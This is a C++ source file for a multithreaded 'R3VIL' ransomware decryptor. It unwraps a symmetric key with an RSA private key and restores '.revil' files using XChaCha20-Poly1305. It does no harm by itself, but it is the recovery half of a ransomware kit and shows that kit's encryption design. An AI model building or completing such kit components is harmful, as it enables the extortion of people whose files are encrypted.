// r3vil_decrypt.cpp - R3VIL Decryptor with Automatic RSA Private Key + XChaCha20Poly1305
#include <cryptopp/cryptlib.h>
#include <cryptopp/rsa.h>
#include <cryptopp/osrng.h>
#include <cryptopp/chachapoly.h>
#include <cryptopp/filters.h>
#include <cryptopp/files.h>

#ifdef _WIN32
#include <windows.h>
#include <shlobj.h>
#else
#include <unistd.h>
#endif

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <algorithm>
#include <cctype>
#include <filesystem>
#include <thread>
#include <mutex>

namespace fs = std::filesystem;
using namespace CryptoPP;

// ====================== KONFIGURASI ======================
const std::string RSA_PRIVATE_KEY_FILE = "rsa_private.der";
const std::string ENCRYPTED_AES_KEY_FILE = "aes_key.enc";
const std::string LOG_FILE = "decryption_log.txt";

// ====================== HELPER ======================
std::string to_lower(const std::string& s) {
    std::string lower = s;
    std::transform(lower.begin(), lower.end(), lower.begin(), [](unsigned char c){ return std::tolower(c); });
    return lower;
}

bool ends_with(const std::string& str, const std::string& suffix) {
    if (suffix.size() > str.size()) return false;
    return str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0;
}

// ====================== DECRYPT AES KEY WITH RSA PRIVATE KEY ======================
bool decrypt_aes_key(const std::string& enc_key_path, SecByteBlock& aes_key) {
    try {
        std::cout << "[*] Loading RSA Private Key from: " << RSA_PRIVATE_KEY_FILE << "\n";

        RSA::PrivateKey priv;
        FileSource privFile(RSA_PRIVATE_KEY_FILE.c_str(), true);
        priv.Load(privFile);

        // Gunakan AutoSeededRandomPool, bukan NullRNG
        AutoSeededRandomPool rng;

        RSAES_OAEP_SHA_Decryptor decryptor(priv);

        std::string enc_key;
        FileSource fs(enc_key_path.c_str(), true, new StringSink(enc_key));

        std::string recovered;
        StringSource ss(enc_key, true,
            new PK_DecryptorFilter(rng, decryptor, new StringSink(recovered))
        );

        if (recovered.size() != 32) {
            std::cout << "[✗] Invalid key size after decryption: " << recovered.size() << " bytes (expected 32)\n";
            return false;
        }

        aes_key.Assign((const byte*)recovered.data(), 32);
        std::cout << "[✓] AES key successfully decrypted (32 bytes)\n";
        return true;
    }
    catch (const Exception& e) {
        std::cout << "[✗] RSA decryption failed: " << e.what() << "\n";
        std::cout << "[!] Pastikan rsa_private.der sesuai dengan rsa_public.der yang digunakan saat enkripsi.\n";
        return false;
    }
}

// ====================== DECRYPT SINGLE FILE ======================
bool decrypt_file(const std::string& encpath, const SecByteBlock& key) {
    try {
        std::cout << "  [*] Decrypting: " << encpath << "\n";

        std::string ciphertext;
        FileSource fs(encpath.c_str(), true, new StringSink(ciphertext));

        if (ciphertext.size() < 24 + 16) {
            std::cout << "  [✗] File too small or corrupted: " << encpath << "\n";
            return false;
        }

        byte nonce[24];
        memcpy(nonce, ciphertext.data(), 24);

        std::string encrypted_data = ciphertext.substr(24);

        XChaCha20Poly1305::Decryption dec;
        dec.SetKeyWithIV(key, key.size(), nonce, 24);

        std::string plaintext;
        AuthenticatedDecryptionFilter filter(dec, new StringSink(plaintext));

        StringSource ss(encrypted_data, true, new Redirector(filter));

        if (!filter.GetLastResult()) {
            std::cout << "  [✗] Authentication failed (wrong key or corrupted file): " << encpath << "\n";
            return false;
        }

        std::string original_path = encpath;
        if (ends_with(to_lower(original_path), ".revil")) {
            original_path = original_path.substr(0, original_path.size() - 6);
        }

        FileSink out(original_path.c_str());
        out.Put(reinterpret_cast<const byte*>(plaintext.data()), plaintext.size());
        out.MessageEnd();

        fs::remove(encpath);

        std::cout << "  [✓] Decrypted: " << original_path << "\n";
        return true;
    }
    catch (const Exception& e) {
        std::cout << "  [✗] Decryption error " << encpath << " - " << e.what() << "\n";
        return false;
    }
    catch (...) {
        std::cout << "  [✗] Unknown error: " << encpath << "\n";
        return false;
    }
}

// ====================== DECRYPT DIRECTORY ======================
void decrypt_directory(const std::string& root, const SecByteBlock& key) {
    std::cout << "[*] Scanning for .revil files in: " << root << "\n";

    std::vector<std::string> files;
    try {
        for (const auto& entry : fs::recursive_directory_iterator(root, fs::directory_options::skip_permission_denied)) {
            if (entry.is_regular_file() && ends_with(to_lower(entry.path().string()), ".revil")) {
                files.push_back(entry.path().string());
            }
        }
    } catch (...) {
        std::cout << "[!] Some folders skipped due to permission\n";
    }

    if (files.empty()) {
        std::cout << "[!] No .revil files found.\n";
        return;
    }

    std::cout << "[+] Found " << files.size() << " encrypted files. Starting decryption...\n";

    std::mutex mtx;
    int success = 0, failed = 0;

    size_t num_threads = std::thread::hardware_concurrency();
    std::vector<std::thread> workers;

    size_t index = 0;
    for (size_t i = 0; i < num_threads; ++i) {
        workers.emplace_back([&]() {
            while (true) {
                std::string file;
                {
                    std::lock_guard<std::mutex> lock(mtx);
                    if (index >= files.size()) return;
                    file = files[index++];
                }
                if (decrypt_file(file, key)) {
                    std::lock_guard<std::mutex> lock(mtx);
                    success++;
                } else {
                    std::lock_guard<std::mutex> lock(mtx);
                    failed++;
                }
            }
        });
    }

    for (auto& t : workers) if (t.joinable()) t.join();

    std::cout << "\n========================================\n";
    std::cout << "          DECRYPTION COMPLETE          \n";
    std::cout << "========================================\n";
    std::cout << "Total files     : " << files.size() << "\n";
    std::cout << "Success         : " << success << "\n";
    std::cout << "Failed          : " << failed << "\n";
    std::cout << "========================================\n";
}

// ====================== MAIN ======================
int main(int argc, char* argv[]) {
    std::cout << "\n========================================\n";
    std::cout << "     R3VIL Ransomware Decryptor        \n";
    std::cout << "   XChaCha20Poly1305 + RSA Auto        \n";
    std::cout << "========================================\n\n";

    std::string target_dir = (argc > 1) ? argv[1] : ".";

    if (!fs::exists(RSA_PRIVATE_KEY_FILE)) {
        std::cout << "[✗] rsa_private.der not found!\n";
        std::cout << "    Letakkan rsa_private.der di folder yang sama dengan decryptor.\n";
        return 1;
    }

    if (!fs::exists(ENCRYPTED_AES_KEY_FILE)) {
        std::cout << "[✗] aes_key.enc not found!\n";
        std::cout << "    Letakkan aes_key.enc di folder yang sama.\n";
        return 1;
    }

    // Dekripsi AES key menggunakan RSA Private Key
    SecByteBlock aes_key(32);
    if (!decrypt_aes_key(ENCRYPTED_AES_KEY_FILE, aes_key)) {
        std::cout << "[✗] Failed to decrypt AES key.\n";
        return 1;
    }

    std::cout << "\n[*] Starting mass decryption on: " << target_dir << "\n\n";

    decrypt_directory(target_dir, aes_key);

    std::cout << "\nAll decryption process finished.\n";
    return 0;
}
